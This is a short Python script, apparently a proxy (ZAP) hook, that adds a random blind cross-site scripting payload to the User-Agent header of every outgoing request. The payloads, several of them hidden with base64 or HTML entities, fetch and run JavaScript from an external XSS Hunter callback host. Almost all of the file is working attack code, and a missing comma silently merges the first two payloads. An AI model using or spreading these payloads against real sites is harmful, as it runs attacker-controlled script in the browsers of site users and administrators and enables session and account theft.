import random

payloads = ['"><script src=https://yastaanabansaelpassword.xss.ht></script>'
    '''javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yastaanabansaelpassword.xss.ht\';document.body.appendChild(a)')''',
    '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veWFzdGFhbmFiYW5zYWVscGFzc3dvcmQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; autofocus>',
    '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veWFzdGFhbmFiYW5zYWVscGFzc3dvcmQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>',
    '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veWFzdGFhbmFiYW5zYWVscGFzc3dvcmQueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>',
    '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;yastaanabansaelpassword.xss.ht&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
    '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yastaanabansaelpassword.xss.ht");a.send();</script>',
    '<script>$.getScript("//yastaanabansaelpassword.xss.ht")</script>']
headers = dict({"User-agent":'Mozilla/5.0 (Linux NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0' + random.choice(payloads)});

def sendingRequest(msg, initiator, helper): 
    for x in list(headers):
      msg.getRequestHeader().setHeader(x, headers[x]);


def responseReceived(msg, initiator, helper): 
    pass;    

